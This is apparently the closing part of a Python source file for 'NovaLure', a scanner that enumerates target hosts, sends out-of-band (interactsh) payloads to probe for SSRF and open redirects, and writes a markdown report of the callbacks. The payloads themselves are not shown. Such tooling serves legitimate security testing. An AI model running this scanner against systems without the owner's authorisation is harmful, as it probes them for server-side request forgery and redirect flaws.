                    elif not args.strict_redirects and test.get("open_redirect_found") and not test.get("method_tag","").startswith("OR_PARAM_") :
                         f.write(f"    - **Potential Open Redirect To (Server Issued Redirect):** `{test['open_redirect_found']}` (Client-side OAST hit not correlated)\n")
                    
                    if test.get("errors"): f.write(f"    - **Errors During Test:** `{test['errors']}`\n")
                    
                    if test.get("interactsh_hits"):
                        client_side_hits_for_or_verification = [h for h in test["interactsh_hits"] if h.get("is_client_hit")]
                        server_side_hits_for_ssrf = [h for h in test["interactsh_hits"] if not h.get("is_client_hit")]
                        
                        if server_side_hits_for_ssrf:
                            f.write(f"    - **Server-Side OAST Interactions ✨:**\n")
                            for hit_num, hit in enumerate(server_side_hits_for_ssrf, 1):
                                f.write(f"      - **Hit {hit_num}:** Protocol: `{hit.get('protocol')}`, Source IP: `{hit.get('source_ip')}`, Timestamp: `{hit.get('timestamp')}`\n")
                                if hit.get('raw_request') and hit.get('protocol') == 'http':
                                    f.write(f"        - HTTP Request (first 300 chars):\n```http\n{hit['raw_request'][:300].strip()}...\n```\n")
                        
                        if client_side_hits_for_or_verification and (is_verified_or_header or is_verified_or_param):
                            f.write(f"    - **Client-Side OAST Hit (Verifying Redirect):**\n")
                            hit = client_side_hits_for_or_verification[0] 
                            f.write(f"      - Protocol: `{hit.get('protocol')}`, Source IP: `{hit.get('source_ip')}` (Scanner's IP), Timestamp: `{hit.get('timestamp')}`\n")
                            if hit.get('raw_request') and hit.get('protocol') == 'http':
                                f.write(f"      - HTTP Request (first 300 chars):\n```http\n{hit['raw_request'][:300].strip()}...\n```\n")
                        f.write("\n") 
            if not has_any_finding_for_url:
                f.write("  - No reportable findings for this target.\n")
            f.write("\n---\n\n")
    console_log(f"Markdown report generated: {report_file_path}", level="REPORT_INFO")

def main():
    global VERBOSE_MODE, QUIET_MODE, NOVALURE_PUBLIC_IP
    parser = argparse.ArgumentParser(
        description="NovaLure: OAST (Out-of-Band Application Security Testing) automation tool.",
        formatter_class=argparse.RawTextHelpFormatter 
    )
    parser.add_argument("-i", "--input-file", help="File containing target domains or URLs (one per line).")
    parser.add_argument("-u", "--url", help="Single target URL or domain (e.g., example.com) to scan.")
    parser.add_argument("-o", "--output-file", default=DEFAULT_REPORT_FILE, help=f"Markdown file to save the scan report.\nDefault: {DEFAULT_REPORT_FILE}")
    parser.add_argument("-t", "--timeout", type=int, default=DEFAULT_REQUEST_TIMEOUT, help=f"Timeout in seconds for HTTP requests.\nDefault: {DEFAULT_REQUEST_TIMEOUT}")
    parser.add_argument("--interactsh-server", default=DEFAULT_INTERACTSH_SERVER_FOR_CLIENT, help=f"Interactsh server URL for the client to connect to.\nDefault: {DEFAULT_INTERACTSH_SERVER_FOR_CLIENT}")
    parser.add_argument("--skip-assetfinder", action="store_true", help="Skip assetfinder.")
    parser.add_argument("--skip-httprobe", action="store_true", help="Skip httprobe.")
    
    # Corrected flags for open redirect testing
    parser.add_argument("--test-open-redirects", dest="test_open_redirects", action="store_true", default=True, help="Enable detailed fuzzing for Open Redirects in GET parameters (Enabled by default).")
    parser.add_argument("--no-test-open-redirects", dest="test_open_redirects", action="store_false", help="Disable detailed fuzzing for Open Redirects in GET parameters.")
    
    parser.add_argument("--strict-redirects", action="store_true", default=False, help="Only report header-based Open Redirects if verified by a client-side OAST hit.")
    parser.add_argument("--keep-interactsh-log", action="store_true", help=f"Keep the temporary Interactsh JSON log ({INTERACTSH_TEMP_HITS_FILE}).")
    parser.add_argument("-v", "--verbose", action="store_true", help="Enable verbose output.")
    parser.add_argument("-q", "--quiet", action="store_true", help="Suppress most informational console output.")
    args = parser.parse_args()

    VERBOSE_MODE = args.verbose
    QUIET_MODE = args.quiet
    if VERBOSE_MODE and QUIET_MODE:
        print(f"{Colors.RED}{Colors.BOLD}[!] Cannot be both verbose (-v) and quiet (-q). Exiting.{Colors.ENDC}"); return

    print_banner() 
    
    input_file_to_process = None 
    actual_input_source_for_report = None # Will hold the string name of the input for the report

    if args.url:
        console_log(f"Single target URL/domain provided via -u: {args.url}", level="INFO")
        temp_file_name = f"temp_novalure_single_target_{int(time.time())}.txt"
        with open(temp_file_name, "w") as f: f.write(args.url.strip() + "\n")
        input_file_to_process = temp_file_name
        actual_input_source_for_report = args.url 
    elif args.input_file: 
        if not os.path.exists(args.input_file):
            console_log(f"Input file '{args.input_file}' provided via -i not found.", level="FATAL"); return
        input_file_to_process = args.input_file
        actual_input_source_for_report = args.input_file
    else: 
        try:
            console_log("No input file or URL specified via command-line flags.", level="INFO")
            user_input_str = input(f"{Colors.YELLOW}{DEFAULT_INPUT_PROMPT_MESSAGE}{Colors.ENDC}").strip()
            if not user_input_str: console_log("No input provided at prompt. Exiting.", level="FATAL"); return

            if os.path.isfile(user_input_str): 
                input_file_to_process = user_input_str
                actual_input_source_for_report = input_file_to_process 
                console_log(f"Using user-provided file: {input_file_to_process}", level="INFO")
            elif '.' in user_input_str and not any(c in user_input_str for c in [' ', '/', '\\']) and len(user_input_str) > 3: 
                temp_file_name = f"temp_novalure_single_target_{int(time.time())}.txt"
                with open(temp_file_name, "w") as f: f.write(user_input_str + "\n")
                input_file_to_process = temp_file_name
                actual_input_source_for_report = user_input_str 
                console_log(f"Processing single target from interactive input: {user_input_str}", level="INFO")
            else:
                console_log(f"Invalid input or file not found: '{user_input_str}'. Exiting.", level="FATAL"); return
        except KeyboardInterrupt: console_log("\nUser aborted input. Exiting.", level="INFO"); return
        except Exception as e: console_log(f"Error during interactive input: {e}", level="FATAL"); return

    if not input_file_to_process:
        console_log("No valid input target or file determined. Exiting.", level="FATAL"); return
    
    args.actual_input_source = actual_input_source_for_report # Store for report function

    if os.path.exists(args.output_file):
        console_log(f"Output file {args.output_file} exists. It will be overwritten.", level="WARN")
        try: os.remove(args.output_file)
        except OSError as e: console_log(f"Could not remove existing report file {args.output_file}: {e}", level="ERROR"); return 
    
    console_log("### NovaLure OAST Scanner Starting ###", level="INFO")
    scan_start_time = datetime.now()

    from requests.packages.urllib3.exceptions import InsecureRequestWarning
    requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

    get_public_ip()

    if not start_interactsh_client(args.interactsh_server):
        console_log("Could not start or configure interactsh-client. Exiting.", level="FATAL"); return
    if not interactsh_base_domain: 
        console_log("Interactsh base domain was not captured. Exiting.", level="FATAL"); stop_interactsh_client(); return

    console_log(f"Interactsh client logging hits to temporary file: {INTERACTSH_TEMP_HITS_FILE}", level="INFO")
    console_log("Giving Interactsh client ~3 seconds to fully initialize before proceeding...", level="INFO")
    time.sleep(3)

    live_urls_to_test = get_live_urls_from_file(input_file_to_process, args.skip_assetfinder, args.skip_httprobe)
    all_scan_results = []

    if live_urls_to_test:
        console_log(f"Starting OAST tests on {len(live_urls_to_test)} URLs...", level="INFO")
        unique_urls_processed = set() # To handle cases where http/https versions of same host are present

        for i, url_to_test_raw in enumerate(live_urls_to_test):
            # Normalize URL slightly for duplicate check (e.g. ignore trailing slash for this check)
            normalized_url_key = url_to_test_raw.rstrip('/')
            if normalized_url_key in unique_urls_processed:
                console_log(f"Skipping already processed URL variant: {url_to_test_raw}", level="DEBUG")
                continue
            unique_urls_processed.add(normalized_url_key)
            
            if not QUIET_MODE and not VERBOSE_MODE:
                 print(f"{Colors.BLUE}[i] Testing URL {i+1}/{len(live_urls_to_test)}: {url_to_test_raw}{Colors.ENDC}")
            elif VERBOSE_MODE : 
                 console_log(f"Testing URL {i+1}/{len(live_urls_to_test)}: {url_to_test_raw}", level="INFO")

            url_results = test_url_for_oast(url_to_test_raw, args.timeout, args) 
            all_scan_results.append(url_results)
            time.sleep(0.1) 
    else:
        console_log("No live URLs found to test.", level="INFO")

    console_log("OAST payload delivery phase complete. Waiting 10 seconds for any lingering Interactsh interactions...", level="INFO")
    time.sleep(10) 
    stop_interactsh_client() 
    all_scan_results_with_hits = parse_and_correlate_interactsh_hits(all_scan_results)
    scan_end_time = datetime.now()
    generate_markdown_report(all_scan_results_with_hits, args.output_file, scan_start_time, scan_end_time, args)

    if input_file_to_process.startswith("temp_novalure_single_target_") and os.path.exists(input_file_to_process):
        os.remove(input_file_to_process) 
    if not args.keep_interactsh_log and os.path.exists(INTERACTSH_TEMP_HITS_FILE):
        console_log(f"Removing temporary Interactsh log: {INTERACTSH_TEMP_HITS_FILE}", level="INFO")
        try: os.remove(INTERACTSH_TEMP_HITS_FILE)
        except OSError as e: console_log(f"Error removing temporary file {INTERACTSH_TEMP_HITS_FILE}: {e}", level="WARN")
    
    console_log("### NovaLure Scan Finished ###", level="SUCCESS_IMPORTANT")

if __name__ == "__main__":
    main()
